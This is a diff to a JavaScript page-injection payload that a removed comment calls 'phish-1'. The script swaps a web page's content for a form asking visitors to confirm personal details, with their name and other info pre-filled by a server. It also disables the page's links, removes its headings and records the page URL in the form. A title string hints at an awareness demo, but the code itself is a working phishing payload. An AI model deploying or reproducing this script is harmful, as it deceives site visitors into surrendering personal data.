@@ -1,6 +1,3 @@
-//phish-1 replaces the body of the page with a form asking for confirmation of certain details.
-//Will have special placeholders with personal info like name etc. filled in by server before addition to payload
-
 var newBody = document.createElement("div");
 newBody.innerHTML = `
 <div width=60%>
@@ -109,6 +106,9 @@ if(toReplace == null){
         }
     }
 }
+if(toReplace == null){
+    toReplace = document.body;
+}
 links = document.getElementsByTagName('a');
 for(var i=0; i < links.length; i++){
     links[i].onclick = function(){return false;};
@@ -123,10 +123,10 @@ for(var i=0; i < possible.length; i++){
             element.parentElement.removeChild(element);
         }
 }
-/* var h1s = document.getElementsByTagName('h1');
+var h1s = document.getElementsByTagName('h1');
 for(var i=0; i < h1s.length; i++)
-    h1s[i].innerText = 'The Internet is a Dangerous Place!';
-document.title = 'The Internet is a Dangerous Place!' */
+    h1s[i].parentElement.removeChild(h1s[i]);
+document.title = 'The Internet is a Dangerous Place!';
 
 toReplace.parentElement.replaceChild(newBody, toReplace);
 document.getElementById('formurl').value=window.location.href;
